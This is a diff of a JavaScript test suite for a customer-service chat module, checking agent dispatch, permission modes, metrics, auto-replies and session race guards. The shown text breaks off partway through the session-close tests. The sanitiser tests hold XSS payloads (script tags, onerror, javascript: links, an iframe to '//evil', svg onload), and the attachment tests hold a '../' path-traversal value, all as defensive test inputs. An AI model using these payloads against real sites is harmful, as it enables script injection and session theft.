@@ -130,6 +130,38 @@ import {
 // 从 server.mjs 转发出来的同一份表：断言转发没断，因为大部分调用方是从这里 import 的。
 import { GROUP_RANK as API_RANK, requireUser } from '../api/_lib/server.mjs'
 import syncHandler, { loginOf, resolveGroup } from '../api/sync-github-groups.mjs'
+// §2/§3/§4 客服。全部起 sx 前缀的别名：这个文件是一个平铺作用域，284 个顶层声明里已经有
+// markRead（站内信那个）、csRow、csBlocked，同名会是一句 SyntaxError 而不是一次失败的断言。
+import {
+  ADMIN_MODES as sxAdminModes, CHANNELS as sxChannels, MESSAGE_FORMATS as sxFormats,
+  dispatchPriority as sxDispatch, isHeartbeatStale as sxStale, isSessionIdle as sxIdle,
+  matchesKeyword as sxMatch, normalizeAttachments as sxAttach, pickAgent as sxPick,
+  pickAutoReply as sxPickReply, prepareMessage as sxPrepare, presentMessage as sxPresent,
+  sanitizeHtml as sxClean, servesChannel as sxServes, sessionCapabilities as sxCaps,
+  sessionMetrics as sxSessionMetrics, timeoutTextKeys as sxTimeoutKeys
+} from '../shared/cs.mjs'
+import { sessionTouchFor as sxTouch } from '../api/_lib/cs.mjs'
+import {
+  claimSession as sxClaimSession, closeSession as sxCloseSession, openSession as sxOpenSession,
+  reopenSession as sxReopenSession, setAdminMode as sxSetAdminMode, setPresence as sxSetPresence,
+  sweepIdleSessions as sxSweep
+} from '../api/cs-session.mjs'
+import {
+  editMessage as sxEditMessage, listMessages as sxListMessages, markRead as sxMarkRead,
+  recallMessage as sxRecallMessage, sendMessage as sxSendMessage, typingGate as sxTypingGate
+} from '../api/cs-message.mjs'
+import {
+  chatCouponCode as sxCouponCode, listSessionOrders as sxSessionOrders,
+  sendCoupon as sxSendCoupon, startRefund as sxStartRefund
+} from '../api/cs-actions.mjs'
+import {
+  dashboard as sxDashboard, listAgents as sxListAgents, listAll as sxListAll,
+  listMine as sxListMine, listQueue as sxListQueue
+} from '../api/cs-workbench.mjs'
+import {
+  NEVER_WRITABLE as SX_RULE_NEVER, createRule as sxCreateRule, deleteRule as sxDeleteRule,
+  listRules as sxListRules, updateRule as sxUpdateRule, validateRule as sxValidateRule
+} from '../api/admin-auto-replies.mjs'
 
 const originalRepository = process.env.GITHUB_REPOSITORY
 const originalToken = process.env.GITHUB_TOKEN
@@ -1241,6 +1273,12 @@ const recorder = (results = {}) => {
       or(expr) { entry.or = expr; return link },
       in(col, vals) { (entry.in ??= {})[col] = vals; return link },
       lt(col, val) { (entry.lt ??= {})[col] = val; return link },
+      // is 要记，而且要能和 eq 区分。会话的「售前没有订单」是 .is('order_id', null)，写成
+      // .eq('order_id', null) 在 PostgREST 里匹配不到任何行——于是每次点客服都新建一个会话，
+      // 而唯一索引会把第二次变成一句报错。
+      is(col, val) { (entry.is ??= {})[col] = val; return link },
+      neq(col, val) { (entry.neq ??= {})[col] = val; return link },
+      gt(col, val) { (entry.gt ??= {})[col] = val; return link },
       not(col, op, val) { (entry.not ??= []).push({ col, op, val }); return link },
       // §12.3 的两段时间筛选：四个边界各自独立，测试要能分别看到订单管理接口把哪个列夹在了
       // 哪两个值之间。记成 map 而不是数组，因为同一列不会有两个同向边界。
@@ -2791,3 +2829,1528 @@ const cpCoupon = {
 }
 
 console.log('Coupons: OK')
+
+// --- §2/§3/§4 客服会话 ------------------------------------------------------------------------------
+// 这一段钉的是三类东西：
+//   1. 纯逻辑（分配优先级、HTML 清洗、首响计时）在 shared/cs.mjs 里的行为
+//   2. 前端和后端对「谁能看见/谁能发言」的判断必须和 SQL 里的 can_see_session / can_post_session 一致
+//   3. 接口在 service client 上跑，所以 update 上的过滤条件就是全部的并发保护
+{
+  // §2.12 分配优先级：admin → cs → presale/postsale。
+  assert(sxDispatch('admin') < sxDispatch('cs'), 'admin 优先于 cs')
+  assert(sxDispatch('cs') < sxDispatch('presale'), 'cs 优先于售前售后')
+  assert(sxDispatch('presale') === sxDispatch('postsale'), '售前售后同级——它们服务不同渠道，不存在谁先谁后')
+  assert(sxDispatch('read') > sxDispatch('postsale'), '非客服组排在所有客服之后')
+
+  // §2.2 渠道资格。这几条必须和 SQL 里的 private.serves_channel 逐字一致，否则工作台显示
+  // 「这单该我接」而接口说不该你，客服看到的是一个点了没反应的按钮。
+  assert(sxServes('presale', 'presale') && !sxServes('presale', 'postsale'), '售前只服务售前')
+  assert(sxServes('postsale', 'postsale') && !sxServes('postsale', 'presale'), '售后只服务售后')
+  assert(sxServes('cs', 'presale') && sxServes('cs', 'postsale'), 'cs 两个渠道都服务')
+  assert(sxServes('admin', 'presale') && sxServes('admin', 'postsale'), 'admin 两个渠道都服务')
+  assert(!sxServes('coworker', 'presale') && !sxServes('read', 'postsale'), '非客服组不服务任何渠道')
+
+  const sxServesSql = schemaSql.match(/create or replace function private\.serves_channel[\s\S]*?\$;/)[0]
+  for (const group of ['admin', 'cs', 'presale', 'postsale']) {
+    assert(sxServesSql.includes(`'${group}'`), `serves_channel 的 SQL 里提到 ${group}`)
+  }
+
+  // §2.7 并发上限。cap 为 0 是「暂时不接新会话」的合法配置，不是「无上限」——把它当成无上限的话，
+  // 一个把上限调成 0 想歇口气的客服会立刻收到所有排队的会话。
+  const sxPool = [
+    { user_id: 'u-presale', group: 'presale', online: true, load: 0, max_concurrent: null },
+    { user_id: 'u-cs', group: 'cs', online: true, load: 3, max_concurrent: null },
+    { user_id: 'u-admin', group: 'admin', online: true, load: 0, max_concurrent: 0 },
+    { user_id: 'u-offline', group: 'admin', online: false, load: 0, max_concurrent: null }
+  ]
+  const sxPicked = sxPick(sxPool, 'presale', { defaultMaxConcurrent: 5 })
+  assert(sxPicked?.user_id === 'u-cs',
+    'admin 上限为 0、另一个 admin 离线，所以轮到 cs——优先级不能越过上限和在线状态')
+  assert(sxPick(sxPool, 'postsale')?.user_id === 'u-cs', '售后渠道排除了只服务售前的那个人')
+  assert(sxPick([{ user_id: 'a', group: 'presale', online: true, load: 5, max_concurrent: null }], 'presale') === null,
+    '满载时返回 null 而不是硬塞给最闲的那个')
+  assert(sxPick([], 'presale') === null, '没有候选人时返回 null')
+
+  // 同优先级同负载时按 user_id 定序。少了这个决胜条件，同一次分配在不同调用里给出不同答案，
+  // 而那种测试会时好时坏。
+  const sxTie = [
+    { user_id: 'bbb', group: 'cs', online: true, load: 1, max_concurrent: null },
+    { user_id: 'aaa', group: 'cs', online: true, load: 1, max_concurrent: null }
+  ]
+  assert(sxPick(sxTie, 'presale')?.user_id === 'aaa' && sxPick([...sxTie].reverse(), 'presale')?.user_id === 'aaa',
+    '同级同负载按 user_id 定序，两种输入顺序给同一个答案')
+
+  // §4.4 HTML 清洗。需求写的是「过滤 <script>」，这里做的是白名单，理由在 shared/cs.mjs 的注释里：
+  // 黑名单漏一个标签的症状是有人偷走了客服的会话，白名单漏一个标签的症状是某个标签不显示。
+  assert(!/script/i.test(sxClean('<p>hi</p><script>alert(1)</script>')), 'script 整块去掉')
+  assert(!/onerror/i.test(sxClean('<img src=x onerror="alert(1)">')), 'onerror 去掉——这是黑名单会漏的第一个')
+  assert(!/javascript:/i.test(sxClean('<a href="javascript:alert(1)">x</a>')), 'javascript: 协议去掉')
+  assert(!/iframe/i.test(sxClean('<iframe src="//evil"></iframe>')), 'iframe 去掉')
+  assert(!/onload/i.test(sxClean('<svg onload="alert(1)"></svg>')), 'svg 的 onload 去掉')
+  assert(!/<style/i.test(sxClean('<style>body{display:none}</style>')), 'style 去掉——它能把整页遮掉')
+  assert(!/script/i.test(sxClean('<scr<script>ipt>alert(1)</script>')), '嵌套拼接不能拼回一个可执行标签')
+  assert(sxClean('<p>正文 <b>粗体</b></p>').includes('<b>'), '允许的标签留着，否则这个功能等于没有')
+  assert(sxClean('<a href="https://example.com">x</a>').includes('href='), 'http(s) 链接留着')
+  assert(sxClean('<a href="/order">x</a>').includes('href='), '站内相对链接留着')
+
+  // §4 的格式判定：不允许的格式要明确拒绝，不能静默降级。静默降级的话，客服以为自己发了一段
+  // 带格式的话，用户看到的是一堆标记符号。
+  const sxHtmlOff = sxPrepare({ body: '<b>x</b>', format: 'html' }, { allowHtml: false })
+  assert(!sxHtmlOff.ok, 'HTML 关闭时发 html 格式要报错，不是悄悄按纯文本发出去')
+  const sxHtmlOn = sxPrepare({ body: '<b>x</b><script>y</script>', format: 'html' }, { allowHtml: true })
+  assert(sxHtmlOn.ok && !/script/i.test(sxHtmlOn.body), 'HTML 开启也要清洗——开关管的是格式，不是安全')
+  assert(!sxPrepare({ body: '', attachments: [] }).ok, '空消息且无附件要拒绝')
+  assert(sxPrepare({ body: '', attachments: [{ path: '11111111-1111-1111-1111-111111111111/a.png', size: 10 }] }).ok,
+    '只有附件没有正文是合法的——发一张截图不必配文字')
+  assert(!sxPrepare({ body: 'x'.repeat(9000) }).ok, '超长正文要拒绝')
+
+  // 附件路径必须是「一段 36 字符的 id / 文件名」。挡的是把附件指向另一个会话目录下的文件——
+  // 那个文件可能是别人的订单截图。归属由 storage 策略最终决定，这里挡住的是形状。
+  assert(!sxPrepare({ body: 'x', attachments: [{ path: '../other/secret.png' }] }).ok,
+    '带 .. 的路径不能通过')
+  assert(!sxPrepare({ body: 'x', attachments: [{ path: 'short/a.png' }] }).ok,
+    '不是 36 字符 id 段的路径不能通过')
+  assert(!sxPrepare({ body: 'x', attachments: [{ path: '11111111-1111-1111-1111-111111111111/a b.png' }] }).ok,
+    '文件名里的空格不能通过——它是拼路径时最容易出事的字符')
+  const sxAttach = sxPrepare({ body: 'x', attachments: [
+    { path: '11111111-1111-1111-1111-111111111111/a.png', kind: 'image', size: 99, name: 'a.png' }] })
+  assert(sxAttach.ok && sxAttach.attachments[0].size === 99,
+    '声明的大小收下来当展示元信息——但它是用户写的数字，不能用来做准入判断')
+  assert(!sxPrepare({ body: 'x', attachments: [
+    { path: '11111111-1111-1111-1111-111111111111/a.png', kind: 'script' }] }).ok,
+    'kind 只能是 image/file/video')
+  assert(!sxPrepare({ body: 'x', attachments: new Array(11).fill(
+    { path: '11111111-1111-1111-1111-111111111111/a.png' }) }).ok, '附件数量有上限')
+
+  // §2.13 首响时间。这是 sessionTouchFor 存在的主要理由：自动回复不能计入首响。
+  const sxSession = { id: 's1', channel: 'presale', user_id: 'u1', agent_id: 'a1', status: 'open',
+    admin_mode: 'none', first_response_seconds: null, opened_at: '2026-08-29T00:00:00.000Z' }
+  const sxAt = new Date('2026-08-29T00:00:30.000Z')
+  const sxAuto = sxTouch(sxSession, { sender_role: 'agent', auto_reply: true }, sxAt)
+  assert(sxAuto.first_response_seconds === undefined,
+    '自动回复不记首响——记了的话每个会话的首响都是零点几秒，§2.13 那个看板就测不出任何东西')
+  const sxReal = sxTouch(sxSession, { sender_role: 'agent', auto_reply: false }, sxAt)
+  assert(sxReal.first_response_seconds === 30, '客服真人回复记首响，从会话建立算起')
+  const sxUser = sxTouch(sxSession, { sender_role: 'user', auto_reply: false }, sxAt)
+  assert(sxUser.first_response_seconds === undefined && sxUser.last_user_message_at,
+    '用户自己发消息不算「有人理他」')
+  const sxSecond = sxTouch({ ...sxSession, first_response_seconds: 5 }, { sender_role: 'agent', auto_reply: false }, sxAt)
+  assert(sxSecond.first_response_seconds === undefined, '首响只记第一次，第二条回复不能把它改掉')
+
+  // §2.13 的两个率。分母必须是全部会话，包括一直没人回的那些——用「有过回复的会话」当分母会让
+  // 这个数字永远接近 100%，而这个看板的全部意义就是暴露没人回的那些。
+  const sxMetrics = sxSessionMetrics([
+    { first_response_seconds: 10, timed_out: false },
+    { first_response_seconds: 20, timed_out: false },
+    { first_response_seconds: null, timed_out: true },
+    { first_response_seconds: null, timed_out: false }
+  ])
+  assert(sxMetrics.total === 4, '总数是全部会话')
+  assert(sxMetrics.answered === 2 && sxMetrics.reply_rate === 0.5,
+    '响应率 = 2/4，没人回的两个留在分母里')
+  assert(sxMetrics.timeout_rate === 0.25, '超时率 = 1/4')
+  assert(sxMetrics.avg_first_response_seconds === 15,
+    '均值只在有回复的那些上算——把没回复的当 0 会让这个数字越差越好看')
+  assert(sxMetrics.median_first_response_seconds === 15,
+    '中位数一起给：一个隔夜才回的会话会把均值彻底带偏')
+  const sxSkew = sxSessionMetrics([
+    { first_response_seconds: 10, timed_out: false },
+    { first_response_seconds: 20, timed_out: false },
+    { first_response_seconds: 6000, timed_out: false }
+  ])
+  assert(sxSkew.median_first_response_seconds === 20 && sxSkew.avg_first_response_seconds > 2000,
+    '一个异常值把均值拉到 2000 以上而中位数还是 20——这就是两个都要给的理由')
+  assert(sxSessionMetrics([]).reply_rate === 0, '空集合不能除零')
+  assert(sxSessionMetrics([]).median_first_response_seconds === null, '空集合的中位数是 null，不是 0')
+
+  // §2.10 三种介入模式，必须和 SQL 里的两个门函数一致。
+  const sxAdminViewer = { userId: 'admin-1', group: 'admin' }
+  const sxAgentViewer = { userId: 'a1', group: 'presale' }
+  const sxUserViewer = { userId: 'u1', group: 'default' }
+  const sxOther = { userId: 'a2', group: 'presale' }
+
+  const sxCapsNone = sxCaps(sxSession, sxAgentViewer)
+  assert(sxCapsNone.can_see && sxCapsNone.can_post, 'none 模式下接待客服能看能发')
+  const sxReadonly = sxCaps({ ...sxSession, admin_mode: 'readonly' }, sxAgentViewer)
+  assert(sxReadonly.can_see && !sxReadonly.can_post, 'readonly：客服能看不能发')
+  const sxBlind = sxCaps({ ...sxSession, admin_mode: 'blind' }, sxAgentViewer)
+  assert(!sxBlind.can_see && !sxBlind.can_post, 'blind：客服彻底看不见')
+  assert(sxCaps({ ...sxSession, admin_mode: 'blind' }, sxAdminViewer).can_post, 'blind 下管理员仍能发')
+  assert(sxCaps({ ...sxSession, admin_mode: 'blind' }, sxUserViewer).can_post,
+    'blind 是对客服隐身，不是把用户也踢出自己的会话')
+  assert(!sxCaps(sxSession, sxOther).can_see, '别的客服看不到已被接走的会话')
+  assert(sxCaps({ ...sxSession, agent_id: null }, sxOther).can_claim, '未接入的会话同渠道客服可以接')
+  assert(!sxCaps({ ...sxSession, agent_id: null, admin_mode: 'blind' }, sxOther).can_claim,
+    'blind 的会话不该出现在任何人的队列里')
+  assert(!sxCaps({ ...sxSession, status: 'closed' }, sxUserViewer).can_post, '关闭的会话不能发言')
+  assert(sxCaps({ ...sxSession, status: 'closed' }, sxUserViewer).can_reopen, '关闭的会话用户能重开')
+  assert(!sxCaps(sxSession, sxUserViewer).can_see_revisions,
+    '用户看不到撤回原文和编辑历史——这是 §2.11 的全部内容')
+  assert(sxCaps(sxSession, sxAgentViewer).can_see_revisions, '客服看得到')
+
+  // 和 SQL 逐条对齐。这两个门函数是 RLS 的实现，JS 那边判松了就是接口放行而数据库拦住（前端报错），
+  // 判紧了就是接口拦住而数据库放行（功能不可用）。两种都是 bug，所以要钉住同一份语义。
+  const sxSeeSql = schemaSql.match(/create or replace function private\.can_see_session[\s\S]*?\$;/)[0]
+  const sxPostSql = schemaSql.match(/create or replace function private\.can_post_session[\s\S]*?\$;/)[0]
+  assert(/admin_mode <> 'blind'/.test(sxSeeSql), 'can_see_session 里排除了 blind')
+  assert(/serves_channel/.test(sxSeeSql), 'can_see_session 用 serves_channel 判队列可见性')
+  assert(/status = 'open'/.test(sxPostSql), 'can_post_session 要求会话是开着的')
+  assert(/not in \('blind','readonly'\)/.test(sxPostSql), 'can_post_session 里 readonly 和 blind 都不能发')
+
+  // §2.11 撤回的呈现。撤回原文不在 cs_messages 行里——它被搬去 cs_message_revisions 了。
+  const sxRecalled = { id: 'm1', body: '', recalled: true, sender_role: 'user', authored_by: 'admin-1' }
+  const sxRevs = [{ message_id: 'm1', kind: 'recall', body: '我说错了', format: 'plain', revision: 1 }]
+  const sxForUser = sxPresent(sxRecalled, sxUserViewer, sxRevs)
+  assert(sxForUser.body === '' && sxForUser.recalled_body === undefined,
+    '用户那侧拿不到原文，连字段都不该出现')
+  assert(sxForUser.authored_by === undefined,
+    '真作者也不给用户——给了就等于把 blind 模式下的介入告诉了用户')
+  const sxForAgent = sxPresent(sxRecalled, sxAgentViewer, sxRevs)
+  assert(sxForAgent.recalled_body === '我说错了' && sxForAgent.body === '',
+    '客服看得到原文，但挂在单独字段上——塞回 body 的话前端画不出「已撤回」的样式')
+
+  const sxEdited = { id: 'm2', body: '第二版', edited_at: '2026-08-29T00:00:00.000Z', sender_role: 'user' }
+  const sxEditRevs = [
+    { message_id: 'm2', kind: 'edit', body: '第一版', format: 'plain', revision: 1 },
+    { message_id: 'm2', kind: 'edit', body: '第零版', format: 'plain', revision: 0 }
+  ]
+  const sxEditForAgent = sxPresent(sxEdited, sxAgentViewer, sxEditRevs)
+  assert(sxEditForAgent.edit_history?.length === 2, '客服看得到编辑历史')
+  assert(sxEditForAgent.edit_history[0].revision === 0, '编辑历史按 revision 升序，否则时间线是倒的')
+  assert(sxPresent(sxEdited, sxUserViewer, sxEditRevs).edit_history === undefined, '用户看不到编辑历史')
+
+  // §2.5 超时判定。
+  const sxIdleOpts = { presaleMinutes: 10, postsaleMinutes: 30, now: new Date('2026-08-29T00:11:00.000Z') }
+  assert(sxIdle({ status: 'open', channel: 'presale', last_activity_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
+    '售前 10 分钟没动就算超时')
+  assert(!sxIdle({ status: 'open', channel: 'postsale', last_activity_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
+    '同样的 11 分钟对售后不算超时——两个渠道的阈值不同')
+  // 已关闭的会话不该再被判成超时：清理任务会一遍遍地对它发一次超时文案。
+  assert(!sxIdle({ status: 'closed', channel: 'presale', last_activity_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
+    '关闭的会话不参与超时判定')
+  // 0 分钟的意思是「不自动关闭」，不是「立刻关闭」。反过来实现的话，管理员想关掉这个功能的那次
+  // 配置会把全站的会话在下一次清理里全部关掉。
+  assert(!sxIdle({ status: 'open', channel: 'presale', last_activity_at: '2026-08-29T00:00:00.000Z' },
+    { presaleMinutes: 0, postsaleMinutes: 30, now: new Date('2026-09-29T00:00:00.000Z') }),
+    '阈值 0 表示不自动关闭')
+  // 没有 last_activity_at 的会话按 created_at 算——两个都缺才不判。
+  assert(sxIdle({ status: 'open', channel: 'presale', created_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
+    'last_activity_at 缺失时回落到 created_at')
+  assert(sxStale('2026-08-29T00:00:00.000Z', 90, new Date('2026-08-29T00:02:00.000Z')),
+    '心跳超过 90 秒算掉线')
+  assert(sxStale(null, 90, new Date()), '从来没打过心跳算掉线，不是算在线')
+
+  // §2.9 超时文案的四个键。渠道和收件人两两组合，少一个键的症状是超时后一方收到空白提示。
+  assert(sxTimeoutKeys('presale').user === 'cs_timeout_text_presale_user', '售前给用户的文案键')
+  assert(sxTimeoutKeys('postsale').agent === 'cs_timeout_text_postsale_agent', '售后给客服的文案键')
+  for (const key of ['presale_user', 'presale_agent', 'postsale_user', 'postsale_agent']) {
+    assert(schemaSql.includes(`cs_timeout_text_${key}`), `site_settings 里有 cs_timeout_text_${key} 的默认值`)
+  }
+
+  // §3.1 关键词匹配与选一条。一次只发一条，否则「我要退款，能退多少」会同时命中三条规则，
+  // 用户收到三段话。
+  assert(sxMatch('我要退款', ['退款'], 'contains'), 'contains 命中')
+  assert(!sxMatch('我要退款', ['发票'], 'contains'), '不含就是不命中')
+  assert(sxMatch('退款', ['退款'], 'exact') && !sxMatch('我要退款', ['退款'], 'exact'), 'exact 要整句相等')
+  assert(sxMatch('退款怎么弄', ['退款'], 'starts_with'), 'starts_with')
+  assert(!sxMatch('我要退款', ['退款'], 'starts_with'), 'starts_with 不能当成 contains')
+  assert(!sxMatch('我要退款', [], 'contains'), '空关键词列表不能匹配一切')
+
+  const sxRules = [
+    { id: 'r-low', enabled: true, trigger: 'keyword', channel: 'both', keywords: ['退款'],
+      match_mode: 'contains', body: 'A', priority: 1, created_at: '2026-01-01T00:00:00.000Z' },
+    { id: 'r-high', enabled: true, trigger: 'keyword', channel: 'both', keywords: ['退款'],
+      match_mode: 'contains', body: 'B', priority: 9, once_per_session: true,
+      created_at: '2026-01-02T00:00:00.000Z' },
+    { id: 'r-presale', enabled: true, trigger: 'keyword', channel: 'presale', keywords: ['退款'],
+      match_mode: 'contains', body: 'C', priority: 99, created_at: '2026-01-03T00:00:00.000Z' }
+  ]
+  const sxHit = sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '我要退款' })
+  assert(sxHit?.id === 'r-high', 'priority 高的赢，且渠道不符的那条不参与')
+  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'presale', text: '我要退款' })?.id === 'r-presale',
+    '售前渠道下那条专属规则赢')
+  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '我要退款',
+    alreadySentRuleIds: ['r-high'] })?.id === 'r-low', 'once_per_session 已发过的跳过，换下一条')
+  // 跳过只对带 once_per_session 的规则生效。不带这个标记的规则本来就该每次都发（「请稍等」那种），
+  // 一律跳过的话，用户第二次问同一件事会得不到任何回应。
+  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '我要退款',
+    alreadySentRuleIds: ['r-low'] })?.id === 'r-high', '没有 once_per_session 的规则不受已发列表影响')
+  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '你好' }) === null,
+    '没命中就是 null，不是随便发一条')
+  assert(sxPickReply(sxRules, { trigger: 'session_open', channel: 'postsale', text: '' }) === null,
+    'trigger 不符的规则不参与')
+}
+console.log('CS logic: OK')
+
+// --- §2 会话接口 -----------------------------------------------------------------------------------
+// 这些接口跑在 service client 上，RLS 不生效，所以 update 上的过滤条件就是全部的并发保护和授权检查。
+// 下面每一条 assert 对应一个「漏掉这个条件会发生什么」。
+//
+// cs_sessions 的桩多数用函数给法而不是数组：assignAgent 和 touchSession 也查这张表，夹在业务的
+// 两次调用中间，按次序数会数错，而数错的表现是一次断言在改了无关代码之后忽然失败。
+{
+  const sxSid = '11111111-1111-1111-1111-111111111111'
+  const sxOid = '22222222-2222-2222-2222-222222222222'
+  const sxUid = '33333333-3333-3333-3333-333333333333'
+  const sxAid = '44444444-4444-4444-4444-444444444444'
+  const sxMid = '55555555-5555-5555-5555-555555555555'
+  const sxOpen = {
+    id: sxSid, channel: 'presale', user_id: sxUid, order_id: null, agent_id: sxAid,
+    status: 'open', admin_mode: 'none', first_response_seconds: null, timed_out: false,
+    reopened_count: 0, opened_at: '2026-08-29T00:00:00.000Z', created_at: '2026-08-29T00:00:00.000Z'
+  }
+  const sxAsUser = { userId: sxUid, group: 'default' }
+  const sxAsAgent = { userId: sxAid, group: 'presale' }
+  const sxAsAdmin = { userId: 'admin-1', group: 'admin' }
+  const SX_DEFAULTS = {
+    cs_max_concurrent_default: 5, cs_heartbeat_timeout_seconds: 90, cs_activity_basis: 'message',
+    cs_timeout_presale_minutes: 10, cs_timeout_postsale_minutes: 30,
+    cs_no_agent_text: '当前无人在线', cs_welcome_text: '请描述您的问题',
+    cs_allow_html: false, cs_allow_bbcode: true, cs_typing_trigger: 'keypress'
+  }
+  // site_settings 一次取多个 key，形状是 { value: ... } 的 jsonb。
+  const sxSettings = (over = {}) => entry => {
+    const all = { ...SX_DEFAULTS, ...over }
+    const keys = entry.in?.key || Object.keys(all)
+    return { data: keys.filter(k => k in all).map(k => ({ key: k, value: { value: all[k] } })), error: null }
+  }
+
+  // §2.1 开会话：已有一个开着的就还回去，不新建。用户在商品页和结算页各点一次客服按钮，
+  // 期望是回到同一个对话，而不是一句唯一约束冲突。
+  const sxDbExisting = recorder({ cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() })
+  const sxAgain = await sxOpenSession(sxDbExisting, sxAsUser, { channel: 'presale' })
+  assert(sxAgain.status === 200 && sxAgain.body.created === false, '已有会话时返回 200 且 created=false')
+  assert(!sxDbExisting.calls.some(c => c.op === 'insert' && c.table === 'cs_sessions'),
+    '已有会话时不该再插一行——插了就撞 cs_one_open_session')
+  assert(sxAgain.body.capabilities?.can_post === true, '答复里带上能力位，前端不用自己解 admin_mode')
+
+  // 售前会话的查询必须用 is('order_id', null)，不能用 eq。eq 在 PostgREST 里匹配不到任何行，
+  // 于是每次点客服都以为没有会话，然后新建，然后撞唯一索引。
+  const sxLookup = sxDbExisting.calls.find(c => c.table === 'cs_sessions' && c.op === 'select')
+  assert(sxLookup.is && 'order_id' in sxLookup.is, "售前会话按 is('order_id', null) 查，不是 eq")
+  assert(sxLookup.filters.status === 'open' && sxLookup.filters.user_id === sxUid,
+    '按用户和 open 状态查——少了 status 会把三个月前关掉的会话还回去')
+
+  // §2.1 售后必须带订单，且订单必须是自己的。
+  const sxNoOrder = await sxOpenSession(recorder(), sxAsUser, { channel: 'postsale' })
+  assert(sxNoOrder.status === 400, '售后会话不带订单要拒绝')
+  const sxPresaleOrder = await sxOpenSession(recorder(), sxAsUser, { channel: 'presale', order_id: sxOid })
+  assert(sxPresaleOrder.status === 400, '售前会话不能绑订单——库里的 check 也不允许')
+  const sxOthersOrder = await sxOpenSession(
+    recorder({ orders: { data: { id: sxOid, user_id: 'someone-else' }, error: null } }),
+    sxAsUser, { channel: 'postsale', order_id: sxOid })
+  assert(sxOthersOrder.status === 404,
+    '别人的订单答 404，和「订单不存在」同一个答复——分开答就是一个能探测订单号的接口')
+
+  // 新建时没有在线客服要给一句话，而不是让用户对着空窗口等（§2.12）。
+  const sxDbNew = recorder({
+    cs_sessions: entry => {
+      if (entry.op === 'insert') return { data: { ...sxOpen, agent_id: null }, error: null }
+      // assignAgent 查负载：拿的是一批行，形状必须是数组。
+      if (entry.selected === 'agent_id') return { data: [], error: null }
+      return { data: null, error: null }
+    },
+    cs_agents: { data: [], error: null },
+    cs_messages: { data: { id: sxMid, session_id: sxSid, sender_role: 'system', auto_reply: false }, error: null },
+    cs_auto_replies: { data: [], error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings()
+  })
+  const sxCreated = await sxOpenSession(sxDbNew, sxAsUser, { channel: 'presale' })
+  assert(sxCreated.status === 201 && sxCreated.body.created === true, '新建返回 201')
+  const sxSysMsgs = sxDbNew.calls.filter(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(sxSysMsgs.some(c => String(c.payload.body).includes('当前无人在线')),
+    '没有在线客服时发出 cs_no_agent_text，用户才知道不是自己网络坏了')
+  assert(sxSysMsgs.some(c => c.payload.auto_reply === true && String(c.payload.body).includes('请描述')),
+    '没有配 session_open 规则时兜底发 cs_welcome_text，并且标成 auto_reply——否则它会被算进首响')
+  const sxOpenEvt = sxDbNew.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert')
+  assert(sxOpenEvt?.payload.kind === 'queued',
+    '没分到人时事件是 queued 而不是 assigned：事后查「这个会话当时有没有人」就靠这一行')
+
+  // §2.12 接入：必须带 is('agent_id', null)。两个客服同时点接入时只有一个能拿到行——
+  // 先查再更新的写法会让两个人接到同一个会话，然后互相看着对方的回复。
+  const sxClaimDb = (load, cap) => recorder({
+    cs_sessions: entry => {
+      if (entry.op === 'update') return { data: { ...sxOpen, agent_id: 'me' }, error: null }
+      // 负载走 head+count，结果在 count 上而不是 data 上。
+      if (entry.selectOpts?.count === 'exact') return { count: load, data: null, error: null }
+      return { data: { ...sxOpen, agent_id: null }, error: null }
+    },
+    cs_agents: { data: { max_concurrent: cap }, error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings()
+  })
+  const sxDbClaim = sxClaimDb(1, null)
+  const sxClaimed = await sxClaimSession(sxDbClaim, { userId: 'me', group: 'presale' }, sxSid)
+  assert(sxClaimed.status === 200, '空闲会话可以接入')
+  const sxClaimUpd = sxDbClaim.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
+  assert(sxClaimUpd.is && 'agent_id' in sxClaimUpd.is,
+    "接入必须带 is('agent_id', null)：这一条就是两个客服抢同一个会话时的全部保护")
+  assert(sxClaimUpd.filters.status === 'open', '接入必须带 status=open：不能接一个已关闭的会话')
+  assert(sxClaimUpd.payload.agent_id === 'me', '只把 agent_id 改成自己，不能改成别人')
+
+  // 上限也要在接入这条路径上判。判在自动分配里管不到主动接入，少这一处，一个客服能手动把自己
+  // 接到二十个会话上。
+  const sxOverCap = await sxClaimSession(sxClaimDb(5, 2), { userId: 'me', group: 'presale' }, sxSid)
+  assert(sxOverCap.status === 409 && /上限（2）/.test(sxOverCap.body.error),
+    '超过并发上限要拒绝接入，并且把上限数字说出来——「已达上限」不告诉客服该关几个')
+  // max_concurrent 为 null 时用全站默认，不是「无限」。
+  const sxDefaultCap = await sxClaimSession(sxClaimDb(5, null), { userId: 'me', group: 'presale' }, sxSid)
+  assert(sxDefaultCap.status === 409, 'null 上限回落到 cs_max_concurrent_default（5），不是不限')
+
+  // 渠道不符的客服不能接。
+  const sxWrongChannel = await sxClaimSession(
+    recorder({ cs_sessions: { data: { ...sxOpen, channel: 'postsale', agent_id: null }, error: null } }),
+    { userId: 'me', group: 'presale' }, sxSid)
+  assert(sxWrongChannel.status === 403, '售前客服不能接售后会话')
+  // blind 模式的会话已被管理员接管，不该还能被客服接走。
+  const sxClaimBlind = await sxClaimSession(
+    recorder({ cs_sessions: { data: { ...sxOpen, admin_mode: 'blind', agent_id: null }, error: null } }),
+    { userId: 'me', group: 'presale' }, sxSid)
+  assert(sxClaimBlind.status === 403, 'blind 会话客服接不了')
+
+  // §2.5 关闭：必须带 status='open'。少了它，一次重复点击会把 closed_at 覆盖成第二次点击的时间，
+  // 而那条时间被 §2.13 用来算时长。
+  const sxDbClose = recorder({
+    cs_sessions: entry => entry.op === 'update'
+      ? { data: { ...sxOpen, status: 'closed' }, error: null } : { data: sxOpen, error: null },
+    cs_messages: { data: { id: sxMid, sender_role: 'system' }, error: null },
+    cs_session_events: { data: null, error: null }
+  })
